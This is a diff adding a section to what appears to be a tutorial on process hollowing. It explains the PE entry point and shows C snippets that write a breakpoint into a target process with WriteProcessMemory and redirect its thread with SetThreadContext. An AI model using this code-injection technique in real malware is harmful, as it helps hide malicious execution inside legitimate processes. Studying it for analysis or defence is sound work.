@@ -476,5 +476,52 @@ Check if the memory write operation was successful. If `bSuccess` is `FALSE`, an
     ```
 Exit the loop once the `.reloc` section has been fully processed. This loop terminates after processing the `.reloc` section to prevent unnecessary iterations.
 
+Now after the relocation step is completed. we should set the EntryPoint for the program. So what is this "Entry Point", The AddressOfEntryPoint is the relative address within the PE file where the execution starts. This is also specified in the Optional Header of the PE file. it is given as an RVA, meaning it is relative to the BaseAddress and it marks the starting point for execution, often where the main function or the entry function for a DLL (like DllMain) resides.
 
+Lets implement this,
 
+The following section of the code sets a breakpoint at the entry point of the PE file. This is done conditionally with the `#ifdef WRITE_BP` directive.
+
+```c
+#ifdef WRITE_BP
+printf("Writing breakpoint\r\n");
+
+if (!WriteProcessMemory(
+    pProcessInfo->hProcess, 
+    (PVOID)dwEntrypoint, 
+    &dwBreakpoint, 
+    4, 
+    0
+))
+{
+    printf("Error writing breakpoint\r\n");
+    return;
+}
+#endif
+```
+The code within #ifdef WRITE_BP is included only if WRITE_BP is defined and the WriteProcessMemory() writes a breakpoint (dwBreakpoint) to the entry point (dwEntrypoint) of the target process.
+
+Passing now to managing the thread context, After setting the breakpoint, the code retrieves and sets the thread context to modify the instruction pointer to the entry point of the PE file.
+
+```
+LPCONTEXT pContext = new CONTEXT();
+pContext->ContextFlags = CONTEXT_INTEGER;
+
+printf("Getting thread context\r\n");
+
+if (!GetThreadContext(pProcessInfo->hThread, pContext))
+{
+    printf("Error getting context\r\n");
+    return;
+}
+
+pContext->Eax = dwEntrypoint;            
+
+printf("Setting thread context\r\n");
+
+if (!SetThreadContext(pProcessInfo->hThread, pContext))
+{
+    printf("Error setting context\r\n");
+    return;
+}
+```
